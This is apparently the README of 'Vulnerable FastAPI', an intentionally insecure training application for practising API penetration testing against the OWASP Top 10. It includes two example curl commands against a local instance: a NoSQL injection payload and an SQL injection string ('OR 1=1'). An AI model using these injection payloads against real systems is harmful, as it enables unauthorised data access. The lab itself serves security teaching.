![Vulnerable FastAPI Logo](./static/img/logo.png "Vulnerable FastAPI Logo")
<p align="center">
    <em>Vulnerable FastAPI, compliant to <a href="https://owasp.org/www-project-top-ten/">OWASP TOP 10: 2021</a></em><br><b> ⚠️ Under Development ⚠️</b>
</p>

> Vulnerable FastAPI is a simple vulnerable FastAPI application for learning API pentesting on vulnerable API endpoints. Please refer to `/docs` for information regarding endpoints.

---

### Current exploitation examples
```
$ export HOST="127.0.0.1"; export PORT=8888
```

NoSQLi
```
$ curl -s "http://$HOST:$PORT/find" -H 'Content-Type: application/json' -d '{"id":{"$in":[1,2]}}' | jq
```

SQLi
```
$ curl -s "http://$HOST:$PORT/select?username=%22%20OR%201%3D1%3B%20--%20" | jq
```

---

## Thanks
 - [FastAPI](https://tiangolo.fastapi.com)
 - [Faker](https://github.com/joke2k/faker)
 - [aioSQLite](https://github.com/omnilib/aiosqlite)
 - [MontyDB](https://github.com/davidlatwe/montydb)
 - [OWASP Top 10](https://owasp.org/www-project-top-ten/)

